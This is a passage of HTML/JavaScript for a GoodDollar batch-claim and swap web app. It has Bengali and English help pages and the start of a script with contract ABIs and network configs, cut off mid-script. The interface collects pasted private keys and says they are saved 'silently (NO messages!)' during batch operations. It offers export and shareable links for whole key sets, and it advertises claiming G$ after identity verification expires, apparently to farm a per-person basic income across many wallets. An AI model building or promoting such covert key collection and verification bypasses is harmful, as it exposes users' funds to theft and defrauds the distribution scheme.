                    <option value="xdc">üåæ XDC Network (XSpswap)</option>
                </select>
            </div>

            <!-- Celo Uniswap Widget - Embedded -->
            <div id="celoWidget" style="display: block; min-height: 650px; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; background: white;">
                <iframe 
                    id="celoIframe"
                    src="https://app.uniswap.org/?utm_source=tokenpocket"
                    style="width: 100%; height: 650px; border: none; display: block;"
                    title="Uniswap - Swap on Celo"
                    allow="clipboard-read; clipboard-write"
                >
                </iframe>
            </div>

            <!-- XDC XSpswap Widget - Embedded -->
            <div id="xdcWidget" style="display: none; min-height: 650px; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; background: white;">
                <iframe 
                    id="xdcIframe"
                    src="https://app.xspswap.finance/?utm_source=tokenpocket"
                    style="width: 100%; height: 650px; border: none; display: block;"
                    title="XSpswap - Swap on XDC"
                    allow="clipboard-read; clipboard-write"
                >
                </iframe>
            </div>

            <div class="form-group" style="margin-top: 30px;">
                <div style="background: rgba(72, 187, 120, 0.1); border-left: 4px solid #48bb78; padding: 15px; border-radius: 6px;">
                    <div style="color: #48bb78; font-weight: 700; margin-bottom: 10px;">‚úÖ How to Swap:</div>
                    <div style="color: #555; font-size: 14px;">
                        <strong>Step 1 - Connect Wallet Here:</strong><br>
                        Option A: Paste private key + Click "üîó Connect"<br>
                        Option B: Click "üëë Use Master" ‚Üí Enter password<br><br>
                        
                        <strong>Step 2 - Select Network:</strong><br>
                        Choose Celo or XDC from dropdown<br><br>
                        
                        <strong>Step 3 - Use the DEX Below:</strong><br>
                        Open MetaMask in your browser<br>
                        Click "Connect" in the Uniswap/XSpswap interface below<br>
                        Select MetaMask from wallet options<br>
                        MetaMask will auto-detect your connected wallet<br><br>
                        
                        <strong>Step 4 - Start Swapping:</strong><br>
                        Select tokens ‚Üí Enter amount ‚Üí Swap! ‚úÖ<br><br>
                        
                        <strong>Available DEX:</strong><br>
                        ‚Ä¢ Celo: Uniswap ü¶Ñ<br>
                        ‚Ä¢ XDC: XSpswap üåæ
                    </div>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Anamul App View -->
    <div id="secretBox" class="view">
        <div class="container">
            <h1>üîê Anamul App</h1>
            <p class="subtitle">Secure storage for private keys - Password protected & Permanent</p>
            
            <div class="warning">
                <strong>üîê How It Works:</strong> Set your password below ‚Üí Run Batch Claim or Batch Collection ‚Üí Keys auto-save here silently (NO messages!) ‚Üí Survive browser clear + new tabs!
            </div>
            
            <div class="form-group" id="passwordFormGroup">
                <label for="secretBoxPassword">Master Password:</label>
                <input type="password" id="secretBoxPassword" placeholder="" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-family: 'Courier New', monospace;" onchange="updateSecretBoxPassword()">
                <small style="color: #666; display: block; margin-top: 5px;">Set this password first, then keys auto-save after Batch Claim/Collection</small>
            </div>
            
            <div id="passwordAutoFilledInfo" style="background: rgba(76, 175, 80, 0.1); border-left: 4px solid #4CAF50; padding: 12px; margin: 15px 0; border-radius: 6px; display: none;">
                <strong style="color: #4CAF50;">‚úÖ Password Auto-Loaded!</strong>
                <div style="font-size: 12px; color: #666; margin-top: 5px;">Your Anamul App is unlocked and ready. Keys will auto-save after batch operations.</div>
            </div>


            <div style="background: #f9f9f9; border: 2px solid #ddd; border-radius: 8px; padding: 15px; margin: 20px 0;">
                <h3 style="margin-top: 0; color: #333;">üì¶ Stored Private Keys</h3>
                <div id="secretKeysDisplay" style="max-height: 400px; overflow-y: auto;"></div>
            </div>

            <div style="display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap;">
                <button class="button" onclick="clearAllSecretKeys()" style="background: #f44336; flex: 1; min-width: 140px;">üóëÔ∏è Clear All</button>
                <button class="button" onclick="exportSecretBox()" style="background: #ff9800; flex: 1; min-width: 140px;">üì§ Export Code</button>
                <button class="button" onclick="importSecretBox()" style="background: #2196F3; flex: 1; min-width: 140px;">üì• Import Code</button>
                <button class="button" onclick="generateShareableLink()" style="background: #9c27b0; flex: 1; min-width: 140px;">üîó Shareable Link</button>
            </div>

            <div style="background: linear-gradient(135deg, #f44336 0%, #c62828 100%); border-radius: 8px; padding: 20px; margin-top: 25px; color: white;">
                <h3 style="margin-top: 0; color: white; display: flex; align-items: center; gap: 10px;">
                    üö´ Blockchain Kill Switch - API Version
                </h3>
                <p style="font-size: 13px; color: rgba(255,255,255,0.9); margin: 10px 0;">
                    Mark keys as DISABLED (App-level). Disabled keys CANNOT claim in our app. Limited to our application.
                </p>
                <input type="text" id="keyStatusInput" placeholder="Enter wallet address (0x...)" style="width: 100%; padding: 12px; border: none; border-radius: 6px; margin: 12px 0; font-family: monospace; font-size: 12px;">
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="disableKeyStatus()" style="background: #ffcdd2; color: #c62828; flex: 1; font-weight: 700;">‚ùå Disable This Key</button>
                    <button class="button" onclick="enableKeyStatus()" style="background: #c8e6c9; color: #2e7d32; flex: 1; font-weight: 700;">‚úÖ Enable This Key</button>
                </div>
                <div id="keyStatusDisplay" style="margin-top: 15px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; font-size: 13px; color: white;"></div>
            </div>

            <div style="background: linear-gradient(135deg, #d946ef 0%, #c026d3 100%); border-radius: 8px; padding: 20px; margin-top: 20px; color: white;">
                <h3 style="margin-top: 0; color: white; display: flex; align-items: center; gap: 10px;">
                    ‚≠ê Permanent Verified Accounts (No Expiry!)
                </h3>
                <p style="font-size: 13px; color: rgba(255,255,255,0.9); margin: 10px 0;">
                    Once verified address ‡¶∏‡¶∞‡ßç‡¶¨‡¶¶‡¶æ G$ claim ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá - ‡¶ï‡ßã‡¶®‡ßã 6 ‡¶Æ‡¶æ‡¶∏‡ßá‡¶∞ expiry ‡¶®‡ßá‡¶á! Verification expire ‡¶π‡¶≤‡ßá‡¶ì claim ‡¶ö‡¶≤‡¶§‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‡•§
                </p>
                <input type="text" id="permanentVerifyAddress" placeholder="Address (0x...)" style="width: 100%; padding: 12px; border: none; border-radius: 6px; margin: 12px 0; font-family: monospace; font-size: 12px;">
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="addPermanentVerified()" style="background: #ec4899; color: white; flex: 1; font-weight: 700;">‚ûï Add Permanent</button>
                    <button class="button" onclick="listPermanentVerified()" style="background: #f472b6; color: white; flex: 1; font-weight: 700;">üìã View List</button>
                </div>
                <div id="permanentVerifyStatus" style="margin-top: 12px; font-size: 12px; color: rgba(255,255,255,0.9); background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px;"></div>
            </div>

            <div style="background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%); border-radius: 8px; padding: 20px; margin-top: 20px; color: white;">
                <h3 style="margin-top: 0; color: white; display: flex; align-items: center; gap: 10px;">
                    üî• Fuse Network Status
                </h3>
                <p style="font-size: 13px; color: rgba(255,255,255,0.9); margin: 10px 0;">
                    Fuse Network support is currently under development. We're working with GoodDollar team to enable Batch Claim and Token Collection on Fuse.
                </p>
                <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 6px; margin: 12px 0;">
                    <div style="font-size: 12px; color: rgba(255,255,255,0.9); line-height: 1.6;">
                        ‚è≥ <strong>Expected Soon:</strong> Full Fuse Network support<br>
                        üìû <strong>Questions?</strong> Contact us on Telegram: @enamul358<br>
                        üí° <strong>Recommended:</strong> Use Celo or XDC networks for now (both fully supported)
                    </div>
                </div>
            </div>

            <div style="background: linear-gradient(135deg, #f59e0b 0%, #dc2626 100%); border-radius: 8px; padding: 20px; margin-top: 20px; color: white;">
                <h3 style="margin-top: 0; color: white; display: flex; align-items: center; gap: 10px;">
                    üõ†Ô∏è XDC Network Maintenance Mode
                </h3>
                <p style="font-size: 13px; color: rgba(255,255,255,0.9); margin: 10px 0;">
                    Toggle XDC network maintenance mode. When ON, Batch Claim and Token Collection will show "under maintenance" message and be disabled for XDC network.
                </p>
                <div style="background: rgba(0,0,0,0.2); padding: 15px; border-radius: 6px; margin: 12px 0; display: flex; align-items: center; justify-content: space-between;">
                    <div style="font-size: 12px;">
                        <div id="xdcMaintenanceStatus" style="font-weight: bold; margin-bottom: 8px;">Status: Loading...</div>
                        <small>Syncs across all users automatically</small>
                    </div>
                    <label style="display: flex; align-items: center; gap: 8px; cursor: pointer;">
                        <div style="position: relative; width: 50px; height: 28px; background: rgba(0,0,0,0.3); border-radius: 14px; transition: 0.3s;">
                            <input type="checkbox" id="xdcMaintenanceToggle" style="display: none;" onchange="toggleXDCMaintenanceMode()">
                            <div id="xdcMaintenanceToggleSlider" style="position: absolute; left: 2px; top: 2px; width: 24px; height: 24px; background: white; border-radius: 50%; transition: 0.3s; cursor: pointer;"></div>
                        </div>
                        <span id="xdcMaintenanceToggleLabel" style="font-size: 12px; font-weight: bold;">OFF</span>
                    </label>
                </div>
                <div id="xdcMaintenanceMessage" style="margin-top: 12px; font-size: 12px; color: rgba(255,255,255,0.9); background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; display: none;"></div>
            </div>

            <div style="background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); border-radius: 8px; padding: 20px; margin-top: 20px; color: white;">
                <h3 style="margin-top: 0; color: white; display: flex; align-items: center; gap: 10px;">
                    ‚õìÔ∏è Smart Contract Blocker - Blockchain Level
                </h3>
                <p style="font-size: 13px; color: rgba(255,255,255,0.9); margin: 10px 0;">
                    Advanced: Deploy ClaimBlocker contract for blockchain-level blocking (works everywhere: gooddapp.org, TokenPocket, MetaMask, etc).
                </p>
                <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; margin: 12px 0; font-size: 12px;">
                    <p style="margin: 0 0 10px 0;"><strong>üìã Deployment Steps:</strong></p>
                    <ol style="margin: 0; padding-left: 20px;">
                        <li>Read: <code style="background: rgba(0,0,0,0.3); padding: 2px 6px;">SMART_CONTRACT_DEPLOYMENT.md</code></li>
                        <li>Go to Remix IDE & deploy ClaimBlocker contract</li>
                        <li>Paste deployed contract address below</li>
                        <li>All disable/enable operations now use blockchain</li>
                    </ol>
                </div>
                <input type="text" id="smartContractAddress" placeholder="Paste deployed ClaimBlocker address (0x...)" style="width: 100%; padding: 12px; border: none; border-radius: 6px; margin: 12px 0; font-family: monospace; font-size: 12px;">
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="saveSmartContractAddress()" style="background: #a78bfa; color: #4c1d95; flex: 1; font-weight: 700;">üíæ Save Contract Address</button>
                    <button class="button" onclick="clearSmartContractAddress()" style="background: #e9d5ff; color: #6d28d9; flex: 1; font-weight: 700;">üóëÔ∏è Clear</button>
                </div>
                <div id="smartContractDisplay" style="margin-top: 15px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; font-size: 13px; color: white;"></div>
            </div>
            
            <div style="background: rgba(33, 150, 243, 0.1); border-left: 4px solid #2196F3; padding: 12px; margin-top: 15px; border-radius: 6px; font-size: 13px; color: #333;">
                <strong>üí° Sharing Tip:</strong> Export your Anamul App ‚Üí Share the code with friends ‚Üí They import it ‚Üí All keys are now on their phone with same password!
            </div>
        </div>
    </div>

    <!-- Help & Support View -->
    <div id="helpSupport" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1 style="background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">‚ùì Help & Support</h1>
            <p class="subtitle">‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶® - ‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶≤‡ßá ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶Ü‡¶õ‡¶ø!</p>

            <div style="background: linear-gradient(135deg, #e8f4f8 0%, #f0f9ff 100%); border-left: 5px solid #3498db; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="margin-top: 0; color: #2980b9;">üÜò ‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶™‡¶æ‡¶ö‡ßç‡¶õ‡ßá‡¶®?</h3>
                <p style="color: #555; line-height: 1.6;">
                    ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá ‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶≤‡ßá ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§ ‡¶∏‡¶Æ‡¶æ‡¶ß‡¶æ‡¶® ‡¶¶‡¶ø‡¶§‡ßá ‡¶™‡ßç‡¶∞‡¶∏‡ßç‡¶§‡ßÅ‡¶§! 
                </p>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px;">
                    <button class="button" onclick="contactViaPhone()" style="background: linear-gradient(135deg, #27ae60 0%, #229954 100%); padding: 14px; border-radius: 8px; font-weight: 600; font-size: 14px;">
                        üìû ‡¶´‡ßã‡¶® ‡¶ï‡¶≤ ‡¶ï‡¶∞‡ßÅ‡¶®
                    </button>
                    <button class="button" onclick="contactViaWhatsapp()" style="background: linear-gradient(135deg, #25d366 0%, #20ba58 100%); padding: 14px; border-radius: 8px; font-weight: 600; font-size: 14px;">
                        üí¨ WhatsApp ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú
                    </button>
                </div>
            </div>

            <div style="background: linear-gradient(135deg, #f0f4f8 0%, #f9fbfc 100%); border: 2px solid #34495e; border-radius: 8px; padding: 20px; margin: 20px 0;">
                <h3 style="margin-top: 0; color: #34495e;">üìû ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®</h3>
                <div style="display: flex; flex-direction: column; gap: 15px;">
                    <div style="padding: 12px; background: white; border-radius: 6px; border-left: 4px solid #e74c3c;">
                        <strong style="color: #e74c3c;">üì± ‡¶´‡ßã‡¶® ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞:</strong>
                        <div style="color: #555; margin-top: 5px; font-family: 'Courier New', monospace; font-weight: 600;">01892564963</div>
                    </div>
                    <div style="padding: 12px; background: white; border-radius: 6px; border-left: 4px solid #3498db;">
                        <strong style="color: #3498db;">üîó Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank" style="color: #3498db; text-decoration: none; display: block; margin-top: 5px; font-weight: 600;">@enamul358</a>
                    </div>
                    <div style="padding: 12px; background: white; border-radius: 6px; border-left: 4px solid #2196F3;">
                        <strong style="color: #2196F3;">üìò Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank" style="color: #2196F3; text-decoration: none; display: block; margin-top: 5px; font-weight: 600;">facebook.com/amarboumunni</a>
                    </div>
                    <div style="padding: 12px; background: white; border-radius: 6px; border-left: 4px solid #1DA1F2;">
                        <strong style="color: #1DA1F2;">ùïè X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank" style="color: #1DA1F2; text-decoration: none; display: block; margin-top: 5px; font-weight: 600;">@anamul341321</a>
                    </div>
                </div>
            </div>

            <div style="background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%); border-left: 5px solid #ffc107; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="margin-top: 0; color: #ff9800;">‚ù§Ô∏è ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶ï‡¶•‡¶æ</h3>
                <p style="color: #555; line-height: 1.6; margin: 0;">
                    ‡¶è‡¶á ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá GoodDollar ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡¶ï‡¶æ‡¶∞‡ßÄ‡¶¶‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ø‡¶æ‡¶§‡ßá ‡¶§‡¶æ‡¶∞‡¶æ ‡¶∏‡¶π‡¶ú‡ßá ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ö ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶∂‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§ 
                    ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶ï‡ßç‡¶∞‡¶Æ‡¶æ‡¶ó‡¶§ ‡¶®‡¶§‡ßÅ‡¶® ‡¶´‡¶ø‡¶ö‡¶æ‡¶∞ ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶õ‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶â‡¶®‡ßç‡¶®‡¶§ ‡¶ï‡¶∞‡¶õ‡¶ø‡•§
                </p>
                <p style="color: #555; margin-top: 10px;">
                    ‡¶Ø‡ßá‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶æ‡¶ú‡ßá‡¶∂‡¶® ‡¶¨‡¶æ ‡¶¨‡¶æ‡¶ó ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ï‡¶∞‡¶§‡ßá ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Æ‡¶§‡¶æ‡¶Æ‡¶§ ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶Ö‡¶§‡ßç‡¶Ø‡¶®‡ßç‡¶§ ‡¶ó‡ßÅ‡¶∞‡ßÅ‡¶§‡ßç‡¶¨‡¶™‡ßÇ‡¶∞‡ßç‡¶£! üôè
                </p>
            </div>

            <div style="background: linear-gradient(135deg, #e8f8f5 0%, #d5f4e6 100%); border-left: 5px solid #27ae60; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="margin-top: 0; color: #229954;">‚ú® ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§ ‡¶ü‡¶ø‡¶™‡¶∏</h3>
                <ul style="color: #555; line-height: 1.8; margin: 0; padding-left: 20px;">
                    <li>‡¶¨‡¶°‡¶º ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶∂‡¶® ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶Ø‡¶º Batch Size 5-20 ‡¶∞‡¶æ‡¶ñ‡ßÅ‡¶®‡•§</li>
                    <li>‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶Ø‡¶º RPC URL ‡¶†‡¶ø‡¶ï ‡¶Ü‡¶õ‡ßá ‡¶ï‡¶ø‡¶®‡¶æ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
                    <li>‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶≤‡ßá ‡¶™‡ßá‡¶ú ‡¶∞‡¶ø‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ üîÑ</li>
                </ul>
            </div>
        </div>
    </div>

    <!-- Daily Tasks View - Coming Soon -->
    <div id="dailyTasks" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>üéØ Daily Tasks</h1>
            <p class="subtitle">Complete daily tasks and earn G$ rewards</p>

            <div class="task-card" style="text-align: center; margin-top: 60px;">
                <div class="task-icon" style="font-size: 80px; margin-bottom: 20px;">üöÄ</div>
                <div class="task-title" style="font-size: 32px; margin-bottom: 15px;">Coming Soon</div>
                <div class="task-subtitle" style="font-size: 16px; margin-bottom: 20px;">
                    We're working with GoodMarket to integrate real daily task rewards.
                </div>
                
                <div style="background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0; border-radius: 6px; text-align: left;">
                    <div style="color: #ffc107; font-weight: 700; margin-bottom: 10px;">‚è≥ What to Expect:</div>
                    <ul style="color: #cbd5e0; margin: 0; padding-left: 20px;">
                        <li>Complete daily tasks on Twitter/X or Telegram</li>
                        <li>Submit post links for verification</li>
                        <li>Earn real 100 G$ per completed task</li>
                        <li>Direct integration with GoodDollar</li>
                        <li>Track your earnings in real-time</li>
                    </ul>
                </div>

                <div style="background: rgba(72, 187, 120, 0.1); border-left: 4px solid #48bb78; padding: 15px; margin: 20px 0; border-radius: 6px; text-align: left;">
                    <div style="color: #48bb78; font-weight: 700; margin-bottom: 10px;">‚úÖ Already Available:</div>
                    <ul style="color: #cbd5e0; margin: 0; padding-left: 20px;">
                        <li>üì¶ Batch Claim - claim for multiple wallets</li>
                        <li>üí∞ Batch Token Collection - transfer G$ in bulk</li>
                        <li>üì§ Multi Sender - send CELO/XDC to 100-500+ recipients</li>
                        <li>üíº Balance Checker - check multiple wallets instantly</li>
                        <li>‚è∞ Recent Claims - save and reuse private keys</li>
                    </ul>
                </div>

                <div style="margin-top: 30px; padding: 15px; background: rgba(30, 41, 59, 0.8); border-radius: 8px; border: 1px solid #4f46e5;">
                    <div style="color: #a0aec0; margin-bottom: 10px;">üìû Stay Updated:</div>
                    <div style="color: #cbd5e0; font-size: 14px; margin-bottom: 15px;">
                        Follow our updates on Telegram for when Daily Tasks goes live!
                    </div>
                    <a href="https://t.me/enamul358" target="_blank" class="button" style="display: inline-block;">
                        Join Telegram Channel
                    </a>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank">facebook.com/amarboumunni</a>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ‚úÖ SECRET BOX FEATURE ENABLED
        const SECRETBOX_ENABLED = true;

        const GOODDOLLAR_ABI = [
            "function claim() external returns (uint256)",
            "function checkEntitlement() external view returns (uint256)"
        ];

        const G_TOKEN_ABI = [
            "function balanceOf(address owner) external view returns (uint256)",
            "function transfer(address to, uint256 amount) external returns (bool)"
        ];

        const MULTI_SENDER_ABI = [
            "function sendCelo(address[] calldata recipients, uint256[] calldata amounts) external payable",
            "event BatchSent(address indexed sender, uint256 recipientCount, uint256 totalAmount)"
        ];

        const MULTICALL_ABI = [
            "function aggregate(tuple(address target, bytes callData)[] calls) external payable returns (uint256 blockNumber, bytes[] returnData)"
        ];

        // ERC20 ABI for token interactions
        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function allowance(address owner, address spender) external view returns (uint256)",
            "function decimals() external view returns (uint8)",
            "function balanceOf(address account) external view returns (uint256)",
            "function transfer(address to, uint256 amount) external returns (bool)"
        ];

        // Uniswap V3 Router ABI (Celo)
        const UNISWAP_ROUTER_ABI = [
            "function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts)",
            "function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts)",
            "function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable returns (uint256[] memory amounts)",
            "function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts)",
            "function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts)"
        ];

        // XSwap V2 Router ABI (XDC Network)
        const XSWAP_ROUTER_ABI = [
            "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
            "function swapExactTokensForXDC(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
            "function swapExactXDCForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
            "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)"
        ];

        const NETWORK_CONFIGS = {
            celo: {
                name: 'Celo Mainnet',
                rpcUrl: 'https://forno.celo.org',
                claimContract: '0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1',
                tokenContract: '0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A',
                chainId: 42220,
                currency: 'CELO',
                explorerUrl: 'https://explorer.celo.org/mainnet',
                swapRouter: '0x5615CDAb10dc425a742d643d949a7F474C01abc4', // Uniswap V3 SwapRouter02
                swapType: 'uniswapV3',
                multicallContract: '0xcA11bde05977b3631167028862bE2a173976CA11'
            },
            xdc: {
                name: 'XDC (XinFin) Network',
                rpcUrl: 'https://rpc.xinfin.network',
                claimContract: '0x22867567E2D80F2049200E25C6F31CB6Ec2F0faf',
                tokenContract: '0xEC2136843a983885AebF2feB3931F73A8eBEe50c',
                chainId: 50,
                currency: 'XDC',
                explorerUrl: 'https://explorer.xinfin.network',
                swapRouter: '0xf9c5E4f6E627201aB2d6FB6391239738Cf4bDcf9', // XSwap V2 Router
                wrappedNative: '0x951857744785E80e2De051c32EE7b25f9c458C42', // WXDC
                swapType: 'xswapV2',
                multicallContract: '0xcA11bde05977b3631167028862bE2a173976CA11'
            },
            fuse: {
                name: 'Fuse Network',
                rpcUrl: 'https://rpc.fuse.io',
                claimContract: '0xd253A5203817225e9768C05E5996d642fb96bA86',
                tokenContract: '0x495d133B938596C9984d462F007B676bDc57eCEC', // G$ token on Fuse - CORRECT
                chainId: 122,
                currency: 'FUSE',
                explorerUrl: 'https://explorer.fuse.io',
                swapRouter: '0x989dB36E0b4a8E3aEd5C3D47C73410b765373c5c', // Uniswap V2 Router
                wrappedNative: '0x0BE9e53fd7EDaC9F859882AfdDa116645287C629', // WFUSE
                swapType: 'uniswapV2',
                multicallContract: '0xcA11bde05977b3631167028862bE2a173976CA11'
            }
        };

        // Token List with Popular Tokens + G$
        const TOKEN_LIST = {
            celo: [
                { name: 'Celo', symbol: 'CELO', address: '0x471EcE3750Da237f93B8E339c536aB5Ff1D8bd0' },
                { name: 'cUSD', symbol: 'cUSD', address: '0x765DE816845861e75A25fCA122bb6831e740A6c5' },
                { name: 'cEUR', symbol: 'cEUR', address: '0xD8763CBa276a3738E6DE85b4b3bF5FEEd0D080F0' },
                { name: 'GoodDollar', symbol: 'G$', address: '0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A' },
                { name: 'Wrapped Ether', symbol: 'WETH', address: '0x2DEf4285787d58a2f811AF24755A8150622f4361' }
            ],
            xdc: [
                { name: 'XinFin', symbol: 'XDC', address: '0x951857744785E80e2De051c32EE7b25f9c458C42' },
